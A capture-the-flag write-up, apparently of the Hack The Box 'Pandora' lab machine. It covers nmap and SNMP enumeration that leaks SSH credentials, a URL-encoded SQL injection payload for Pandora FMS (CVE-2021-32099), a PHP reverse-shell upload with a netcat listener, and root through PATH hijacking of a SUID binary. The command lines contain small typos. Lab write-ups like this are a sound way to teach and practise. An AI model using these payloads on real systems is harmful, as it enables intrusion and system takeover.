#### Initial TCP Scan
```
nmap -sC -sV 10.10.11.136 -oN pandora.nmap

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Play | Landing
|_http-server-header: Apache/2.4.41 (Ubuntu)
9001/tcp open  http    PHP cli server 5.5 or later
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```



#### Findings UDP Scan
```
sudo nmap  -sU 10.10.11.136 -oN udp.nmap -vv
PORT    STATE SERVICE REASON
161/udp open  snmp    udp-response ttl 63

sudo nmap -p 161 -sU -sC -sV 10.10.11.136
826:
|     Name: sh
|     Path: /bin/sh
|     Params: -c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'	

ssh daniel@10.10.11.136 
password: HotelBabylon23
```
Found 3 Users
```
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
matt:x:1000:1000:matt:/home/matt:/bin/bash
daniel:x:1001:1001::/home/daniel:/bin/bash
```
#### Port Forwarding with SSH
```
ssh -L 8000:localhost:80 daniel@10.10.11.136

http://127.0.0.1:8000/pandora_console/
```
#### Pandora FMS 742:POC CVE-2021-32099 
```
https://github.com/ibnuuby/cve-2021-32099
https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained
```
#### Using the link below in Browser and refreshing Pandora_console page, we get access to Admin Panel.
```
http://localhost:8000/pandora_console/include/chart_generator.php?session_id=a%27%20UNION%20SELECT%20%27a%27,1,%27id_usuario%7Cs:5:%22admin%22;%27%20as%20data%20FROM%20tsessions_php%20WHERE%20%271%27=%271
```
#### Uploading revershell.php

Navigatig to ```Admin Tools > File Manager```  to upload the ```reverse-shell.php```

#### Getting a shell
Navigating to browser URL
```
127.0.0.1:8000/pandora_console/images/revshell.php
and Listening on Port 4444
nc -lvnp 444
We get a Shell as Matt User
```
#### SSH connection with Matt User
```
Exporting (Kali) id_rsa.pub to (Matt) .ssh/authorized_keys
```
#### Finding Sudo Permissions in Root
```
find / -perm -u=s -type f 2>/dev/null
```
Interesting: ```/usr/bin/pandora_backup```

#### Getting Root
```
echo "/bin/bash" > tar
chmod +x tar
export PATH=$(pwd):$PATH
```
Run: ```/usr/bin/pandora_backup```

We are Root!
